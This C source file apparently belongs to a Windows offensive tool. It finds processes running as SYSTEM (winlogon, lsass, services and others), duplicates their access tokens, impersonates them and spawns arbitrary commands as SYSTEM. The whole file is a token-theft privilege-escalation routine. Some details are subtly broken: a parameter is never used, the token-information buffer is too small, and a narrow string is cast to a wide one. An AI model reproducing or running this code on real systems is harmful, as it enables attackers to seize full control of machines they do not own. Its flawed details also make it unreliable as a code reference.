#include "token_manipulation.h"
#include <stdlib.h>
#include <string.h>
#include <stdio.h>
#include <tlhelp32.h>
#include <winbase.h>

static HANDLE g_original_token = NULL;

int jocky_find_system_process(
    const char* preferred_process,
    TOKEN_PROCESS_INFO* out_info) {

    if (!out_info) {
        return -1;
    }

    /* Common SYSTEM processes in priority order */
    const WCHAR* system_processes[] = {
        L"winlogon.exe",
        L"services.exe",
        L"lsass.exe",
        L"svchost.exe",
        L"wininit.exe",
        L"csrss.exe"
    };

    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hSnapshot == INVALID_HANDLE_VALUE) {
        return -1;
    }

    PROCESSENTRY32 pe32;
    pe32.dwSize = sizeof(PROCESSENTRY32);

    if (!Process32First(hSnapshot, &pe32)) {
        CloseHandle(hSnapshot);
        return -1;
    }

    do {
        /* Check if this process matches our target list */
        for (int i = 0; i < sizeof(system_processes)/sizeof(system_processes[0]); i++) {
            if (system_processes[i] == NULL) continue;

            if (wcscmp(pe32.szExeFile, system_processes[i]) == 0) {
                /* Try to open and check if it's SYSTEM */
                HANDLE hProcess = OpenProcess(PROCESS_QUERY_INFORMATION, FALSE, pe32.th32ProcessID);
                if (hProcess) {
                    HANDLE hToken;
                    if (OpenProcessToken(hProcess, TOKEN_QUERY, &hToken)) {
                        TOKEN_USER token_user;
                        DWORD dwSize = 0;

                        if (GetTokenInformation(hToken, TokenUser, &token_user, sizeof(token_user), &dwSize)) {
                            /* Check if this is SYSTEM SID (S-1-5-18) */
                            SID_IDENTIFIER_AUTHORITY sia = SECURITY_NT_AUTHORITY;
                            PSID system_sid = NULL;

                            if (AllocateAndInitializeSid(&sia, 1, SECURITY_LOCAL_SYSTEM_RID,
                                                         0, 0, 0, 0, 0, 0, 0, &system_sid)) {

                                if (EqualSid(token_user.User.Sid, system_sid)) {
                                    /* Found SYSTEM process */
                                    out_info->pid = pe32.th32ProcessID;
                                    wcsncpy(out_info->process_name, pe32.szExeFile, 255);
                                    out_info->is_system = 1;

                                    CloseHandle(hToken);
                                    CloseHandle(hProcess);
                                    FreeSid(system_sid);
                                    CloseHandle(hSnapshot);
                                    return 0;
                                }

                                FreeSid(system_sid);
                            }
                        }

                        CloseHandle(hToken);
                    }
                    CloseHandle(hProcess);
                }
            }
        }
    } while (Process32Next(hSnapshot, &pe32));

    CloseHandle(hSnapshot);
    return -1;
}

int jocky_enum_system_processes(
    TOKEN_PROCESS_INFO* processes,
    int max_count,
    int* out_count) {

    if (!processes || !out_count || max_count <= 0) {
        return -1;
    }

    *out_count = 0;
    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hSnapshot == INVALID_HANDLE_VALUE) {
        return -1;
    }

    PROCESSENTRY32 pe32;
    pe32.dwSize = sizeof(PROCESSENTRY32);

    if (!Process32First(hSnapshot, &pe32)) {
        CloseHandle(hSnapshot);
        return -1;
    }

    do {
        if (*out_count >= max_count) break;

        HANDLE hProcess = OpenProcess(PROCESS_QUERY_INFORMATION, FALSE, pe32.th32ProcessID);
        if (hProcess) {
            HANDLE hToken;
            if (OpenProcessToken(hProcess, TOKEN_QUERY, &hToken)) {
                TOKEN_USER token_user;
                DWORD dwSize = 0;

                if (GetTokenInformation(hToken, TokenUser, &token_user, sizeof(token_user), &dwSize)) {
                    SID_IDENTIFIER_AUTHORITY sia = SECURITY_NT_AUTHORITY;
                    PSID system_sid = NULL;

                    if (AllocateAndInitializeSid(&sia, 1, SECURITY_LOCAL_SYSTEM_RID,
                                                 0, 0, 0, 0, 0, 0, 0, &system_sid)) {

                        if (EqualSid(token_user.User.Sid, system_sid)) {
                            processes[*out_count].pid = pe32.th32ProcessID;
                            wcsncpy(processes[*out_count].process_name, pe32.szExeFile, 255);
                            processes[*out_count].is_system = 1;
                            (*out_count)++;
                        }

                        FreeSid(system_sid);
                    }
                }

                CloseHandle(hToken);
            }
            CloseHandle(hProcess);
        }
    } while (Process32Next(hSnapshot, &pe32));

    CloseHandle(hSnapshot);
    return (*out_count > 0) ? 0 : -1;
}

HANDLE jocky_duplicate_process_token(
    uint32_t source_pid,
    uint32_t desired_access) {

    HANDLE hSourceProcess = OpenProcess(PROCESS_QUERY_INFORMATION, FALSE, source_pid);
    if (!hSourceProcess) {
        return NULL;
    }

    HANDLE hSourceToken;
    if (!OpenProcessToken(hSourceProcess, TOKEN_DUPLICATE | desired_access, &hSourceToken)) {
        CloseHandle(hSourceProcess);
        return NULL;
    }

    HANDLE hDuplicateToken;
    if (!DuplicateTokenEx(hSourceToken, desired_access, NULL, SecurityImpersonation,
                          TokenPrimary, &hDuplicateToken)) {
        CloseHandle(hSourceToken);
        CloseHandle(hSourceProcess);
        return NULL;
    }

    CloseHandle(hSourceToken);
    CloseHandle(hSourceProcess);

    return hDuplicateToken;
}

int jocky_impersonate_token(HANDLE token) {
    if (!token) {
        return -1;
    }

    if (!ImpersonateLoggedOnUser(token)) {
        return -1;
    }

    return 0;
}

int jocky_spawn_as_system(
    const char* command_line,
    const char* source_process,
    uint32_t* out_pid) {

    if (!command_line || !out_pid) {
        return -1;
    }

    /* Find SYSTEM process */
    TOKEN_PROCESS_INFO proc_info;
    if (jocky_find_system_process(source_process, &proc_info) != 0) {
        return -1;
    }

    /* Duplicate its token */
    HANDLE hSystemToken = jocky_duplicate_process_token(proc_info.pid,
                                                        TOKEN_ADJUST_DEFAULT |
                                                        TOKEN_ADJUST_SESSIONID |
                                                        TOKEN_QUERY |
                                                        TOKEN_DUPLICATE |
                                                        TOKEN_ASSIGN_PRIMARY);

    if (!hSystemToken) {
        return -1;
    }

    /* Create process with SYSTEM token */
    STARTUPINFOW si = {0};
    si.cb = sizeof(STARTUPINFOW);
    PROCESS_INFORMATION pi = {0};

    if (!CreateProcessAsUserW(hSystemToken, NULL, (LPWSTR)command_line, NULL, NULL,
                              FALSE, CREATE_NEW_CONSOLE, NULL, NULL, &si, &pi)) {
        CloseHandle(hSystemToken);
        return -1;
    }

    *out_pid = pi.dwProcessId;

    CloseHandle(pi.hThread);
    CloseHandle(pi.hProcess);
    CloseHandle(hSystemToken);

    return 0;
}

int jocky_elevate_to_system(HANDLE system_token) {
    if (!system_token) {
        return -1;
    }

    if (!ImpersonateLoggedOnUser(system_token)) {
        return -1;
    }

    return 0;
}

HANDLE jocky_get_current_token(uint32_t desired_access) {
    HANDLE hToken;
    if (!OpenProcessToken(GetCurrentProcess(), desired_access, &hToken)) {
        return NULL;
    }
    return hToken;
}

int jocky_is_system_user(void) {
    HANDLE hToken = jocky_get_current_token(TOKEN_QUERY);
    if (!hToken) {
        return 0;
    }

    TOKEN_USER token_user;
    DWORD dwSize = 0;

    int is_system = 0;
    if (GetTokenInformation(hToken, TokenUser, &token_user, sizeof(token_user), &dwSize)) {
        SID_IDENTIFIER_AUTHORITY sia = SECURITY_NT_AUTHORITY;
        PSID system_sid = NULL;

        if (AllocateAndInitializeSid(&sia, 1, SECURITY_LOCAL_SYSTEM_RID,
                                     0, 0, 0, 0, 0, 0, 0, &system_sid)) {

            is_system = EqualSid(token_user.User.Sid, system_sid);
            FreeSid(system_sid);
        }
    }

    CloseHandle(hToken);
    return is_system;
}

int jocky_restore_original_token(void) {
    if (!g_original_token) {
        RevertToSelf();
        return 0;
    }

    if (!ImpersonateLoggedOnUser(g_original_token)) {
        return -1;
    }

    return 0;
}
